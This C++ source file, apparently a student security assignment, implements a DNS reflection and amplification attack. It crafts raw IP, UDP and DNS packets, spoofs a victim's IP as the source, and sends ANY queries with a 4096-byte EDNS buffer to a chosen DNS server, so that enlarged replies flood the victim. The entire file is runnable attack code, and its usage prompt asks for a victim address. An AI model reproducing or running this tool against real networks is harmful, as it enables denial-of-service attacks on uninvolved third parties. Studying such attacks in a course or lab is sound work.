#include <iostream>
#include <cstdio>
#include <cstdlib>
#include <cstring> // bzero
#include <sys/socket.h> // socket
#include <netinet/ip.h> // ip header
#include <netinet/udp.h> // udp header
#include <arpa/inet.h> // inet_addr, htons

#include <chrono>
#include <thread>

#define MAX_BUFF 65535 // ipv4 packet max length
#define DNS_PORT 53 // dns port
#define DNS_REPEAT 3 // dns queries repeat time
#define DOMAIN_NAME "4ieee3org" // dns special format

struct dnshdr {
    uint16_t queryid;
    uint16_t flags; // bit-mask to indicate request/response
    uint16_t qu_count; // questions count
    uint16_t an_count; // answers count
    uint16_t au_count; // authority count
    uint16_t ad_count; // additional records count
} __attribute__((packed));

struct dnsdata {
    unsigned char dname[10]; // domain name with special format
    uint16_t dnstype;
    uint16_t dnsclass;
} __attribute__((packed));

struct dnsopt{
    unsigned char name;
    unsigned short type;
    unsigned short udplength;
    unsigned char rcode;
    unsigned char ednsversion;
    unsigned short Z;
    unsigned short datalength;
} __attribute__((packed));

/*
struct dnsflag {
    qr[1] = 0;
    opcode[4] = 0000;
    aa[1] = 0;
    tc[1] = 0;
    rd[1] = 1;
    ra[1] = 1;
    z[3] = 000;
    rcode[4] = 0000;
};
*/

void err_exit(const char *x) {
    perror(x);
    exit(1);
}

unsigned short checksum(void *in, int size){
    long sum = 0;
    unsigned short *ptr = (unsigned short *)in;

    // sum up
    for (; size > 1; size -= 2) {
        sum += *ptr++;
    }

    // zero-padding if length is odd
    if (size > 0) {
        sum += *((unsigned char *) ptr);
    }

    // overflow
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    // return 1's complement
    return ~sum;
}

void set_dns(unsigned char *packet, size_t &packetlen) {
    // pointer to start of dns header
    struct dnshdr *dnsh = (struct dnshdr *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr));
    // fill in dns header
    dnsh -> queryid = htons(0x73B6); // last 16 bits (2 bytes) of student ID 0816054
    dnsh -> flags = htons(0x0100); // shown on the top of dns flag structure
    dnsh -> qu_count = htons(1); // one question ANY
    dnsh -> ad_count = htons(1); // one OPT for EDNS
    packetlen += sizeof(struct dnshdr);
    // pointer to start of dns data
    struct dnsdata *dnsd = (struct dnsdata *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr));
    // fill in dns data
    dnsd -> dnstype = htons(255); // 255 for any (*)
    dnsd -> dnsclass = htons(1); // 1 for internet
    // transform the domain name into special format, digit to hex
    unsigned char transformed[] = DOMAIN_NAME;
    for (int i = 0; i < strlen(DOMAIN_NAME); i++) {
        if (isdigit(transformed[i])) {
            transformed[i] = transformed[i] - 48;
        }
    }
    memcpy(dnsd -> dname, transformed, strlen(DOMAIN_NAME));
    packetlen += sizeof(struct dnsdata);
    // fill in EDNS opt
    struct dnsopt *dnso = (struct dnsopt *) (packet + sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(struct dnshdr) + sizeof(struct dnsdata));
    dnso -> name = 0;
    dnso -> type = htons(41);
    dnso -> udplength = htons(4096); // increase to 4096 bytes
    dnso -> rcode = 0;
    dnso -> ednsversion = 0;
    dnso -> Z = htons(0x8000);
    dnso -> datalength = 0;
    packetlen += sizeof(struct dnsopt);
}

void set_udphdr(unsigned char *packet, size_t &packetlen, int srcport) {
    // pointer to start of udp header
    struct udphdr *udp = (struct udphdr *) (packet + sizeof(struct iphdr));
    // update packet length
    packetlen += sizeof(struct udphdr);
    // fill in udp header
    udp -> source = htons(srcport);
    udp -> dest = htons(DNS_PORT);
    udp -> len = htons(packetlen); // udp packet total length (include header)
    udp -> check = checksum(packet, packetlen);
}

void set_iphdr(unsigned char *packet, size_t &packetlen, char *saddr, char *daddr) {
    // pointer to start of ip header
    struct iphdr *ip = (struct iphdr *) packet;
    // update packet length
    packetlen += sizeof(struct iphdr);
    // fill in ip header
    ip -> ihl = 5; // header length (32 bit increments)
    ip -> version = 4; // ipv4
    ip -> tos = 0; // normal (type of service)
    ip -> tot_len = htons(packetlen); // ip packet total length (include header)
    ip -> ttl = 64; // time to live
    ip -> protocol = IPPROTO_UDP; // udp
    ip -> check = checksum(packet, packetlen);
    ip -> saddr = inet_addr(saddr); // ip spoofing
    ip -> daddr = inet_addr(daddr);
}

int main(int argc, char *argv[]) {
    // declaration
    int srcport;
    int sockfd; // socket file descriptor
    int on; // socket option
    struct sockaddr_in dstaddr; // socket destination address
    socklen_t dstlen;
    unsigned char packet[MAX_BUFF]; // packet buffer
    size_t packetlen;

    // return usage
    if (argc != 4) {
        printf("How to use: %s <Victim IP> <UDP Source Port> <DNS Server IP>", argv[0]);
        exit(1);
    }

    // check port value
    srcport = atoi(argv[2]);
    if (srcport < 0 || srcport > 65535) {
        err_exit("main: wrong port value");
    }

    // create a raw socket
    if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0) {
        err_exit("main: socket");
    }

    // set socket option to build the ip header by self
    on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(int)) < 0) {
        err_exit("main: setsockopt");
    }

    // fill in destination address
    bzero(&dstaddr, sizeof(dstaddr));
    dstaddr.sin_family = AF_INET;
    dstaddr.sin_addr.s_addr = inet_addr(argv[3]); // dns server
    dstaddr.sin_port = htons(DNS_PORT); // dns port
    dstlen = sizeof(dstaddr);

    // encapsulate the packet (from inside)
    packetlen = 0;
    memset(packet, 0, MAX_BUFF);
    set_dns(packet, packetlen);
    set_udphdr(packet, packetlen, srcport);
    set_iphdr(packet, packetlen, argv[1], argv[3]);

    // send to destination
    for (int i = 0; i < DNS_REPEAT; i++) {
        if (sendto(sockfd, packet, packetlen, 0, (struct sockaddr *) &dstaddr, dstlen) < 0) {
			err_exit("main: sendto");
        }
        printf("Sending DNS packet to DNS server %s with spoofed source %s:%d\n", argv[3], argv[1], srcport);
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));//sleep(1);
    }

    return 0;
}
